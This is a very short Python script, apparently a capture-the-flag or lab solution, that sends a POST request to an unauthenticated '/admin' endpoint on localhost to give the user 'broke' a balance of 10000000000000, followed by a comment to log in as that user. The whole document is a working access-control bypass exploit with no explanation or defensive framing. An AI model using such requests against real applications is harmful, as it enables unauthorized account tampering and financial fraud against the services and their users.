import requests
url="http://127.0.0.1:5000/admin"

r = requests.post(url,data={"username":"broke","money":"10000000000000"})

#then login as broke